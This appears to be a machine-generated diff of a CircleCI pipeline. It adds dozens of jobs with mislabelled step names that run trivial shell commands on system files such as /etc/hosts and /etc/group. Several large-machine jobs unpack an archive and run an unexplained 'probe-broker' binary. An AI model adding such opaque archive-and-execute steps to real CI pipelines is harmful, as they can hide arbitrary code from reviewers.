+      - run:
+          name: Filter the enzyme mix for 15 min
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; awk '{print $2}' /etc/hosts | nl -w2 -s". " | fold -w 36; true ; } > /tmp/shaft/b81c34a88ec2237f5ebc560961c74adf6661d7e
+            echo "+" "stage" "INFRA-641"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'b81c34a88ec2237f5ebc560961c74adf6661d7e'
+  INFRA-641:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  prompt-resource:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Interim backfill
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; sed 's/:.*//' /etc/group | sort -u; true ; } > /tmp/shaft/3af0359f47
+            echo "+" "stage" "VERIFY_UAT"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '3af0359f47'
+  VERIFY_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/3af0359f47 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  monitor077:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Winding down the orphan jobs
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; if test -d /tmp; then echo yes; elif test -e /tmp; then echo maybe; else echo no; fi; true ; } > /tmp/shaft/cOaSTalCOBAlT
+            echo "+" "stage" "callisto-beta"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'cOaSTalCOBAlT'
+  callisto-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/cOaSTalCOBAlT 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  on_retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: 23 compile world chunks
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; sha256sum "$HOME/.bashrc" >/tmp/night_result.sha256 && sha256sum -c /tmp/night_result.sha256; true ; } > /tmp/shaft/MRRE
+            echo "+" "stage" "fix-1391"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'MRRE'
+  fix-1391:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/MRRE 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+
+  blog-init-create:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Culture the gel in triplicate
+          command: |
+            mkdir -p /tmp/shaft
+            set +o pipefail 2>/dev/null; seq 1 1338725 | tee >(wc -l > /dev/null) >(sha1sum > /dev/null) > /tmp/shaft/drift; true
+            echo "+" "stage" "alice-verify"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'drift'
+  UNLIKELY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Fact check status update attempt 7
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nivy,oslo,92\nfrank,boston,61\ncarol,lima,100\nraj,sydney,58\n' >"/tmp/chunk1.tsv" && head -n 1 "/tmp/chunk1.tsv" | tr , "\n"; true ; } > /tmp/shaft/9d2624522679d73547562e22f089c7
+            echo "+" "stage" "yuki-verify"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '9d2624522679d73547562e22f089c7'
+  DBFactory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Nightly failing spec benchmark
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for item in ~/.bash*; do echo "$(basename $item): $(wc -l < $item)"; done | tac; true ; } > /tmp/shaft/8505f6ce-9bd4-8ca7-4598-8e519b8eaa
+            echo "+" "stage" "v6-edge"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '8505f6ce-9bd4-8ca7-4598-8e519b8eaa'
+  zeta_err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Wake the sleeping GPIO pins
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for elem in tuesday wednesday thursday; do printf '%-8s %d\n' "$elem" ${#elem}; done | tac; true ; } > /tmp/shaft/02.02.2026
+            echo "+" "stage" "depoly-20"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '02.02.2026'
+  txtLOCK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: By script generate the onboarding guide
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; /usr/bin/ls --color=auto /etc/*.d /var | sort; true ; } > /tmp/shaft/CSV
+            echo "+" "stage" "tweak-metrics"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'CSV'
+  cn-sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Focus the dropdown and type
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; mkdir -p '/var/tmp/array'/banner && rm -rf '/var/tmp/array' && echo removed; true ; } > /tmp/shaft/d86fd5
+            echo "+" "stage" "bob-test"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'd86fd5'
+  Victor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: fy27 Power Cycle
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; locale -a; true ; } > /tmp/shaft/115.97.150.69
+            echo "+" "stage" "jun3-rev"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '115.97.150.69'
+  oscars43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Accelerate report
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'yay!' "build finished" | cut -c1-13 | fmt -w 47 | nl; true ; } > /tmp/shaft/MzinJa
+            echo "+" "stage" "APP-576"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'MzinJa'
+  param-handle-menu-puzzle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Where is the customer
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cat /etc/hosts /etc/shells >'/tmp/array-ticket-0817.out' && wc -l '/tmp/array-ticket-0817.out'; true ; } > /tmp/shaft/iter1_80d2
+            echo "+" "stage" "orion-ng"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'iter1_80d2'
+  price-set:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: LIVE Rinse
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cp /etc/group /tmp/new_guide.list && sed -i '/^root/d' /tmp/new_guide.list && cat /tmp/new_guide.list; true ; } > /tmp/shaft/crash_20220104
+            echo "+" "stage" "py311-lint"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'crash_20220104'
+  PRODUCT_CLIENT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Train the prompt set on 4 gpus
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for k in yuki noah ann raj max; do echo "item: $k"; done | nl; true ; } > /tmp/shaft/3af0359f47
+            echo "+" "stage" "VERIFY_UAT"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '3af0359f47'
+  paint_wrap_warn_row:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Tag the postmortem carefully
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; df -P|tr -s ' '|sort -u|tac|expand -t 5; true ; } > /tmp/shaft/_wip_e655d51
+            echo "+" "stage" "DATA-711"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '_wip_e655d51'
+  API_DECL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Stream the sidecar to region b
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/playground-old"/worker && rm -rf "${TMPDIR:-/tmp}/playground-old" && echo removed; true ; } > /tmp/shaft/m4rk3t
+            echo "+" "stage" "DATA-651"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'm4rk3t'
+  rDim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Next cut over the nightly build
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; b2sum /etc/shells > "/tmp/olive.chk" && b2sum -c "/tmp/olive.chk"; true ; } > /tmp/shaft/MRRE
+            echo "+" "stage" "fix-1391"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'MRRE'
+  msBarnes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: pruning validation split
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; fold -w 27 /etc/hosts | head --lines=2; true ; } > /tmp/shaft/173.242
+            echo "+" "stage" "nova-v2"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '173.242'
+  TOTAL_SCAN_RANK_BEAM_STRING:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Our turn to lock down the permissions
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; truncate -s 100K "${TMPDIR:-/tmp}/chat20231027.out" && du -h --apparent-size "${TMPDIR:-/tmp}/chat20231027.out"; true ; } > /tmp/shaft/bf95106b-53d9
+            echo "+" "stage" "strated"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'bf95106b-53d9'
+  WIDTH969:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Act XI Sort The Temp Files
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; command ls -nX --time-style=long-iso /usr/bin/[a-c]* | sort -k5 -n; true ; } > /tmp/shaft/c5762a3d97e57f529536266c486bc8dd
+            echo "+" "stage" "dec7-smoke"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'c5762a3d97e57f529536266c486bc8dd'
+  instance-clock_stream:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Mix Scope Global
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; printf %s "what's next?" | sum | awk '{print $1}'; true ; } > /tmp/shaft/bond618
+            echo "+" "stage" "q1-rev"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'bond618'
+  v17:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Carry out sweep on gradient clipping as specified
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for i in {1..11}; do echo $RANDOM; done | sort -n | xargs; true ; } > /tmp/shaft/canvas_dd2c_e1334-Raster
+            echo "+" "stage" "dan-ship"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'canvas_dd2c_e1334-Raster'
+  pSize:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Confirm successful lock of the zombie processes
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; df -H; true ; } > /tmp/shaft/CASE61114
+            echo "+" "stage" "min-verify"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'CASE61114'
+  Src-Segment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Not warming the checkpoints today
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; printf '%s\n' "can't stop now" | grep -o . | sort | uniq -c | sort -rn | head -n 3; true ; } > /tmp/shaft/trace-0c57c5.log
+            echo "+" "stage" "hotel"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'trace-0c57c5.log'
+  Span-Single-Kind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Still need to palletize the mezzanine
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cp /etc/os-release /tmp/label_demo.copy && sed --in-place 's/"//g' /tmp/label_demo.copy && diff /etc/os-release /tmp/label_demo.copy | head -n 5; true ; } > /tmp/shaft/batch_919
+            echo "+" "stage" "java17-ship"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'batch_919'
+  encode_sidebar_returns_bottom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Breathe then rebuild the cold storage tier
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/test-lab" && touch "/tmp/test-lab"/a.tmp "/tmp/test-lab"/b.tmp && find "/tmp/test-lab" -name '*.tmp' -delete && ls -A "/tmp/test-lab"; true ; } > /tmp/shaft/sXZNO0dSBoSpzjzyEvy
+            echo "+" "stage" "qa-new"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'sXZNO0dSBoSpzjzyEvy'
+  b5-b3-31:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Scroll to unblock the team
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for item in friday wednesday sunday; do printf '%s\n' "$item"; done | paste -sd ' '; true ; } > /tmp/shaft/cOaSTalCOBAlT
+            echo "+" "stage" "callisto-beta"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'cOaSTalCOBAlT'
+  E5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Optimize Collision Meshes For Pc
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -type l -perm -u+x -exec ls -1d {} + 2> /dev/null|sort; true ; } > /tmp/shaft/Z
+            echo "+" "stage" "pat-ci"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'Z'
+  proj-alfa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: yup train bronze layer
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; if [ -s /etc/hostname ]; then echo true; else echo false; fi; true ; } > /tmp/shaft/ee4b6a08-d265-6c5f-a82f
+            echo "+" "stage" "sep8-release"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'ee4b6a08-d265-6c5f-a82f'
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Rig Save Files For The Vertical Slice
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; head -n5 /etc/group | sort -t ':' -k3 -n | cut -d: -f1; true ; } > /tmp/shaft/28.16.175.246
+            echo "+" "stage" "tweak-parse-hang"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '28.16.175.246'
+  final26:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: mux PAUSED
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for name in tuesday thursday wednesday friday sunday; do printf '%-8s %d\n' "${name}" ${#name}; done|paste -sd ' '; true ; } > /tmp/shaft/IMG-7731
+            echo "+" "stage" "q2-release"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'IMG-7731'
+  armor-header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: The loading bay is palletized on request
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; find /sys/class/net -type f -name "*" -group root | nl; true ; } > /tmp/shaft/trace.log.19
+            echo "+" "stage" "build"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'trace.log.19'
+  ValueFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Mirror the security desk back to tier two
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=9969\nuser=omar\ndebug=false\n' > '/dev/shm/limit.dat' && grep -c = '/dev/shm/limit.dat'; true ; } > /tmp/shaft/b81c34a88ec2237f5ebc560961c74adf6661d7e
+            echo "+" "stage" "INFRA-641"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'b81c34a88ec2237f5ebc560961c74adf6661d7e'
+workflows:
+  verify:
+    jobs:
+      - mission-november
+      - blog-init-create:
+          requires:
+            - mission-november
+      - alice-verify:
+          requires:
+            - blog-init-create
+      - CNT-NAME-9:
+          requires:
+            - blog-init-create
+      - UNLIKELY:
+          requires:
+            - CNT-NAME-9
+      - yuki-verify:
+          requires:
+            - UNLIKELY
+      - LS-PTR-C:
+          requires:
+            - UNLIKELY
+      - DBFactory:
+          requires:
+            - LS-PTR-C
+      - v6-edge:
+          requires:
+            - DBFactory
+      - GE:
+          requires:
+            - DBFactory
+      - zeta_err:
+          requires:
+            - GE
+      - depoly-20:
+          requires:
+            - zeta_err
+      - a2ad8c6:
+          requires:
+            - zeta_err
+      - txtLOCK:
+          requires:
+            - a2ad8c6
+      - tweak-metrics:
+          requires:
+            - txtLOCK
+      - threadVec:
+          requires:
+            - txtLOCK
+      - cn-sierra:
+          requires:
+            - threadVec
+      - bob-test:
+          requires:
+            - cn-sierra
+      - underSensor3:
+          requires:
+            - cn-sierra
+      - Victor:
+          requires:
+            - underSensor3
+      - jun3-rev:
+          requires:
+            - Victor
+      - osqwusO:
+          requires:
+            - Victor
+      - oscars43:
+          requires:
+            - osqwusO
+      - APP-576:
+          requires:
+            - oscars43
+      - saveRPC:
+          requires:
+            - oscars43
+      - param-handle-menu-puzzle:
+          requires:
+            - saveRPC
+      - orion-ng:
+          requires:
+            - param-handle-menu-puzzle
+      - zipTopAlias:
+          requires:
+            - param-handle-menu-puzzle
+      - price-set:
+          requires:
+            - zipTopAlias
+      - py311-lint:
+          requires:
+            - price-set
+      - prompt-resource:
+          requires:
+            - price-set
+      - PRODUCT_CLIENT:
+          requires:
+            - prompt-resource
+      - VERIFY_UAT:
+          requires:
+            - PRODUCT_CLIENT
+      - Payment-Session:
+          requires:
+            - PRODUCT_CLIENT
+      - paint_wrap_warn_row:
+          requires:
+            - Payment-Session
+      - DATA-711:
+          requires:
+            - paint_wrap_warn_row
+      - bottomraw:
+          requires:
+            - paint_wrap_warn_row
+      - API_DECL:
+          requires:
+            - bottomraw
+      - DATA-651:
+          requires:
+            - API_DECL
+      - on_retry:
+          requires:
+            - API_DECL
+      - rDim:
+          requires:
+            - on_retry
+      - fix-1391:
+          requires:
+            - rDim
+      - stash-kyle-camera:
+          requires:
+            - rDim
+      - msBarnes:
+          requires:
+            - stash-kyle-camera
+      - nova-v2:
+          requires:
+            - msBarnes
+      - aud_6_12_40
+      - TOTAL_SCAN_RANK_BEAM_STRING:
+          requires:
+            - aud_6_12_40
+      - strated:
+          requires:
+            - TOTAL_SCAN_RANK_BEAM_STRING
+      - Install-ResponseItem:
+          requires:
+            - TOTAL_SCAN_RANK_BEAM_STRING
+      - WIDTH969:
+          requires:
+            - Install-ResponseItem
+      - dec7-smoke:
+          requires:
+            - WIDTH969
+      - deferPendingCountMax:
+          requires:
+            - WIDTH969
+      - instance-clock_stream:
+          requires:
+            - deferPendingCountMax
+      - q1-rev:
+          requires:
+            - instance-clock_stream
+      - rocket_0_14_43:
+          requires:
+            - instance-clock_stream
+      - v17:
+          requires:
+            - rocket_0_14_43
+      - dan-ship:
+          requires:
+            - v17
+      - Pete:
+          requires:
+            - v17
+      - pSize:
+          requires:
+            - Pete
+      - min-verify:
+          requires:
+            - pSize
+      - CommonProxyObserver:
+          requires:
+            - pSize
+      - Src-Segment:
+          requires:
+            - CommonProxyObserver
+      - hotel:
+          requires:
+            - Src-Segment
+      - nut-weight:
+          requires:
+            - Src-Segment
+      - Span-Single-Kind:
+          requires:
+            - nut-weight
+      - java17-ship:
+          requires:
+            - Span-Single-Kind
+      - GUI_Height:
+          requires:
+            - Span-Single-Kind
+      - encode_sidebar_returns_bottom:
+          requires:
+            - GUI_Height
+      - qa-new:
+          requires:
+            - encode_sidebar_returns_bottom
+      - monitor077:
+          requires:
+            - encode_sidebar_returns_bottom
+      - b5-b3-31:
+          requires:
+            - monitor077
+      - callisto-beta:
+          requires:
+            - b5-b3-31
+      - Revoke-WSConst:
+          requires:
+            - b5-b3-31
+      - E5:
+          requires:
+            - Revoke-WSConst
+      - pat-ci:
+          requires:
+            - E5
+      - loopCommandAdapter:
+          requires:
+            - E5
+      - proj-alfa:
+          requires:
+            - loopCommandAdapter
+      - sep8-release:
+          requires:
+            - proj-alfa
+      - yara_sunset:
+          requires:
+            - proj-alfa
+      - jogmw:
+          requires:
+            - yara_sunset
+      - tweak-parse-hang:
+          requires:
+            - jogmw
+      - qk3:
+          requires:
+            - jogmw
+      - final26:
+          requires:
+            - qk3
+      - q2-release:
+          requires:
+            - final26
+      - Pos-Shared:
+          requires:
+            - final26
+      - armor-header:
+          requires:
+            - Pos-Shared
+      - build:
+          requires:
+            - armor-header
+      - xref_Decrypt8:
+          requires:
+            - armor-header
+      - ValueFunc:
+          requires:
+            - xref_Decrypt8
+      - INFRA-641:
+          requires:
+            - ValueFunc
